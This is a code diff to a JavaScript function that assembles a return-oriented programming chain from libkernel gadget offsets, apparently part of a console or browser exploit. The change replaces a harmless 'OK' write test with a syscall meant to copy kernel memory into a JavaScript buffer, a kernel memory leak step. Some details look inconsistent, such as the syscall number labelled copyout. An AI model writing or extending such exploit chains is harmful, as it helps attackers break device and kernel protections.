@@ -10,35 +10,30 @@ function setupROP() {
   const GADGET_POP_X3 = LIBKERNEL_BASE + 0x1A3060;
   const GADGET_SYSCALL = LIBKERNEL_BASE + 0x1A2F28;
 
-  const SYSCALL_WRITE = 0x04;
-  const FD_STDOUT = 1;
-  const STR_PTR = 0x133713370300; // offset into the same buffer
-  const STR_LEN = 3;
+  const SYSCALL_COPYOUT = 0x3B;
+  const KERNEL_SRC = LIBKERNEL_BASE;                 // Try leaking start of libkernel
+  const JS_DEST = 0x133713370300;                    // Known offset in JS memory
+  const COPY_LEN = 8;
 
-  // Step 1: syscall number (x0)
+  // x0 = syscall number
   ropChain[i++] = GADGET_POP_X0 & 0xFFFFFFFF;
-  ropChain[i++] = SYSCALL_WRITE;
+  ropChain[i++] = SYSCALL_COPYOUT;
 
-  // Step 2: fd (x1)
+  // x1 = kernel src address
   ropChain[i++] = GADGET_POP_X1 & 0xFFFFFFFF;
-  ropChain[i++] = FD_STDOUT;
+  ropChain[i++] = KERNEL_SRC & 0xFFFFFFFF;
 
-  // Step 3: buf (x2)
+  // x2 = user dest buffer
   ropChain[i++] = GADGET_POP_X2 & 0xFFFFFFFF;
-  ropChain[i++] = STR_PTR;
+  ropChain[i++] = JS_DEST;
 
-  // Step 4: len (x3)
+  // x3 = length
   ropChain[i++] = GADGET_POP_X3 & 0xFFFFFFFF;
-  ropChain[i++] = STR_LEN;
+  ropChain[i++] = COPY_LEN;
 
-  // Step 5: syscall
+  // syscall
   ropChain[i++] = GADGET_SYSCALL & 0xFFFFFFFF;
 
-  // Step 6: string "OK\\n" at known offset
-  const strOffset = 0x300 / 4; // 0x300 bytes → 0xC0 32-bit words
-  ropChain[strOffset + 0] = 0x004B4F4F; // 'O''K' + null terminator
-  ropChain[strOffset + 1] = 0x0000000A; // newline (0x0A)
-
-  debug_log("ROP chain (sys_write) initialized.");
+  debug_log(\"ROP chain (copyout) initialized.\");
   return ropChain;
 }
